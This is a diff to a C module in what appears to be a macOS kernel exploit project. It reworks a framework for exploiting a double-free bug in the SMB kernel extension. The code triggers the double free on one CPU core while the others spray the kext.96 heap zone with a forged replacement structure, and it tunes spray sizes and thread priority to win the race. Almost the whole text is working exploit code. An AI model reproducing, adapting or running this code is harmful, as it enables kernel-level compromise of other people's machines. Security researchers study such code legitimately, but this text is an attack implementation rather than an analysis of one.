@@ -16,27 +16,33 @@
 #include <xe/util/log.h>
 #include <xe/util/assert.h>
 
+#include <macos/kernel.h>
+
 #include "../smb/nic_allocator.h"
 #include "../smb/client.h"
 
 #include "kheap_free.h"
 #include "allocator_rw.h"
 #include "allocator_nrnw.h"
-#include "allocator_nic_parallel.h"
 #include "oob_reader_ovf.h"
 
-#include <macos/kernel.h>
+
+///
+/// This module provide a framework for exploiting the double free vulnerability discussed in
+/// "POCs/poc_double_free". See "../smb_dev_rw.c" for an example use of this module
+///
 
 
-#define NUM_SLOW_DOWN_NICS 25
+#define NUM_SLOW_DOWN_NICS 10
 #define NUM_SOCKETS_PER_SLOW_DOWN_NIC 12500
-#define NUM_KEXT_96_FRAGMENTED_PAGES 1024
+#define NUM_SOCKADDR_ALLOCS_PER_NIC 1024
 
 
 struct xe_kheap_free_session {
-    kmem_allocator_nrnw_t nrnw_allocator;
     smb_nic_allocator nic_allocator;
-    kmem_allocator_nic_parallel_t capture_allocator;
+    
+    smb_nic_allocator* capture_allocators;
+    int num_capture_allocators;
     
     enum {
         STATE_CREATED,
@@ -135,8 +141,8 @@ xe_kheap_free_session_t xe_kheap_free_session_create(const struct sockaddr_in* s
     xe_kheap_free_session_t session = malloc(sizeof(struct xe_kheap_free_session));
     session->smb_addr = *smb_addr;
     session->nic_allocator = -1;
-    session->capture_allocator = NULL;
-    session->nrnw_allocator = kmem_allocator_nrnw_create(smb_addr);
+    session->capture_allocators = NULL;
+    session->num_capture_allocators = 0;
     session->state = STATE_CREATED;
     return session;
 }
@@ -167,7 +173,7 @@ struct complete_nic_info_entry xe_kheap_free_session_prepare(xe_kheap_free_sessi
 }
 
 
-void xe_kheap_free_session_execute(xe_kheap_free_session_t session, const struct complete_nic_info_entry* entry) {
+void xe_kheap_free_session_execute(xe_kheap_free_session_t session, const struct complete_nic_info_entry* replacement_entry) {
     xe_assert(session->state == STATE_PREPARED);
     
     xe_log_info("preparing for free");
@@ -189,26 +195,62 @@ void xe_kheap_free_session_execute(xe_kheap_free_session_t session, const struct
     /// 96 to the double free NIC. Since these socket addresses are released before the release
     /// of `struct complete_nic_info_entry`, they will fill the per CPU cache of the CPU handling
     /// this job
-    xe_kheap_free_alloc_slowdown_nic(session->nic_allocator, (uint32_t)entry->nic_index, 512, 96);
+    xe_kheap_free_alloc_slowdown_nic(session->nic_allocator, (uint32_t)replacement_entry->nic_index, 512, 96);
     
-    kmem_allocator_nic_parallel_t capture_allocator = kmem_allocator_nic_parallel_create(&session->smb_addr, 1024 * 512);
-
-    /// Trigger the double free in background thread
-    dispatch_semaphore_t sem_dbf_trigger = dispatch_semaphore_create(0);
-    dispatch_async(xe_dispatch_queue(), ^() {
-        struct network_nic_info info;
-        bzero(&info, sizeof(info));
-        info.nic_index = (uint32_t)entry->nic_index;
-        int error = smb_nic_allocator_allocate(session->nic_allocator, &info, 1, sizeof(info));
-        xe_assert(error == ENOMEM);
-        dispatch_semaphore_signal(sem_dbf_trigger);
+    /// We will be using one CPU core for triggering the double free and others for spraying
+    /// the kext.96 zone with replacement data
+    int num_capture_allocators = xe_cpu_count() - 1;
+    smb_nic_allocator* capture_allocators = malloc(sizeof(smb_nic_allocator) * num_capture_allocators);
+    dispatch_apply(num_capture_allocators, DISPATCH_APPLY_AUTO, ^(size_t index) {
+        capture_allocators[index] = smb_nic_allocator_create(&session->smb_addr, sizeof(struct sockaddr_in));
+        xe_assert_cond(capture_allocators[index], >=, 0);
     });
     
-    /// In the same time, spray kext.96 with the replacement `struct complete_nic_info_entry`
-    kmem_allocator_nic_parallel_alloc(capture_allocator, ((char*)entry) + 8, 88);
-    dispatch_semaphore_wait(sem_dbf_trigger, DISPATCH_TIME_FOREVER);
+    /// Reduce effect of other processes
+    dispatch_queue_t queue = dispatch_queue_create("dbf", dispatch_queue_attr_make_with_qos_class(DISPATCH_QUEUE_CONCURRENT, QOS_CLASS_USER_INITIATED, DISPATCH_QUEUE_PRIORITY_HIGH));
+    volatile _Bool* capture_done = alloca(sizeof(_Bool));
+    *capture_done = FALSE;
     
-    session->capture_allocator = capture_allocator;
+    dispatch_apply(xe_cpu_count(), queue, ^(size_t index) {
+        if (index == xe_cpu_count() - 1) {
+            /// Trigger double free
+            struct network_nic_info info;
+            bzero(&info, sizeof(info));
+            info.nic_index = (uint32_t)replacement_entry->nic_index;
+            int error = smb_nic_allocator_allocate(session->nic_allocator, &info, 1, sizeof(info));
+            xe_assert(error == ENOMEM);
+            *capture_done = TRUE;
+        } else {
+            /// Spray kext.96 zone with replacement data
+            smb_nic_allocator allocator = capture_allocators[index];
+            
+            struct network_nic_info* infos = malloc(sizeof(struct network_nic_info) * NUM_SOCKADDR_ALLOCS_PER_NIC);
+            for (int sock_idx=0; sock_idx<NUM_SOCKADDR_ALLOCS_PER_NIC; sock_idx++) {
+                struct network_nic_info* info = &infos[sock_idx];
+                info->nic_link_speed = UINT32_MAX;
+                info->addr_4.sin_len = 96;
+                info->addr_4.sin_family = AF_INET;
+                info->addr_4.sin_addr.s_addr = sock_idx;
+                memcpy(&info->addr_4.sin_zero[0], (const char*)replacement_entry + 8, sizeof(*replacement_entry) - 8);
+                info->next_offset = sizeof(*info);
+            }
+            
+            /// Keep on spraying until capture completes
+            for (int nic_idx=0; !*capture_done; nic_idx++) {
+                for (int sock_idx=0; sock_idx<NUM_SOCKADDR_ALLOCS_PER_NIC; sock_idx++) {
+                    struct network_nic_info* info = &infos[sock_idx];
+                    info->nic_index = nic_idx;
+                }
+                int error = smb_nic_allocator_allocate(allocator, infos, NUM_SOCKADDR_ALLOCS_PER_NIC, sizeof(struct network_nic_info) * NUM_SOCKADDR_ALLOCS_PER_NIC);
+                xe_assert_err(error);
+            }
+            
+            free(infos);
+        }
+    });
+    
+    session->capture_allocators = capture_allocators;
+    session->num_capture_allocators = num_capture_allocators;
     session->state = STATE_DONE;
 }
 
@@ -220,11 +262,12 @@ void xe_kheap_free_session_destroy(xe_kheap_free_session_t* session_p) {
         smb_nic_allocator_destroy(&session->nic_allocator);
     }
     
-    if (session->capture_allocator) {
-        kmem_allocator_nic_parallel_destroy(&session->capture_allocator);
+    if (session->capture_allocators) {
+        dispatch_apply(session->num_capture_allocators, DISPATCH_APPLY_AUTO, ^(size_t idx) {
+            smb_nic_allocator_destroy(&session->capture_allocators[idx]);
+        });
     }
     
-    kmem_allocator_nrnw_destroy(&session->nrnw_allocator);
     free(session);
     *session_p = NULL;
 }
